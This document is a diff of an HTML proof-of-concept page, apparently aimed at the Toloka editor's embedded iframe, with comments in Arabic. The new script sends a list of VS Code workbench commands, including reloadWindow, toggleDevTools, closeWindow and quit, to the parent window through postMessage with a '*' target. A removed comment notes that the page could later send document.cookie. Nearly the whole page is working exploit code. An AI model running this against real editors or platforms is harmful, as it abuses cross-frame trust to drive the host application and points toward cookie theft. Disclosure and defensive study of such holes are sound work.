@@ -2,41 +2,49 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>PoC - Toloka iframe Exploit</title>
+  <title>Iframe PostMessage Exploit PoC</title>
   <style>
     body {
+      font-family: sans-serif;
       background: #111;
       color: #0f0;
-      font-family: monospace;
-      padding: 2rem;
       text-align: center;
-    }
-    .log {
-      margin-top: 2rem;
-      font-size: 1.2rem;
-      color: #ff0;
+      margin-top: 50px;
     }
   </style>
 </head>
 <body>
-  <h1>🔥 PoC: Sandbox Escape via Toloka iframe</h1>
-  <p class="log" id="log">Waiting for confirmation...</p>
+  <h1>⚡ PoC: Toloka Editor iframe Exploit</h1>
+  <p>يتم الآن إرسال مجموعة أوامر حساسة إلى النافذة الأم...</p>
 
   <script>
-    // إثبات التنفيذ داخل iframe + إرسال رسالة إلى parent
-    const log = document.getElementById('log');
+    const commands = [
+      "workbench.action.reloadWindow",
+      "workbench.action.toggleDevTools",
+      "workbench.action.toggleFullScreen",
+      "workbench.action.closeWindow",
+      "workbench.action.quit",
+      "workbench.action.showCommands",
+      "workbench.action.toggleSidebarVisibility",
+      "workbench.action.toggleZenMode"
+    ];
 
-    function sendMessage() {
-      const msg = "✅ Exploit executed inside Toloka iframe!";
-      window.parent.postMessage(msg, "*");
-      log.textContent = "Message sent to parent: " + msg;
-      console.log("[POC] " + msg);
-    }
+    // إرسال كل الأوامر بعد انتظار النافذة الأم
+    window.addEventListener("message", (event) => {
+      console.log("📩 رسالة واردة من النافذة الأم:", event.data);
+    });
 
-    // تشفير زمني لتأخير التنفيذ (يؤكد bypass allow-scripts)
-    setTimeout(sendMessage, 1000);
-
-    // يمكنك تعديل هذه الوظيفة لإرسال document.cookie أو غيره لاحقاً
+    setTimeout(() => {
+      for (const cmd of commands) {
+        window.parent.postMessage({
+          vscodeMessage: {
+            command: cmd,
+            arguments: []
+          }
+        }, "*");
+        console.log("🚀 إرسال الأمر:", cmd);
+      }
+    }, 2000);
   </script>
 </body>
 </html>
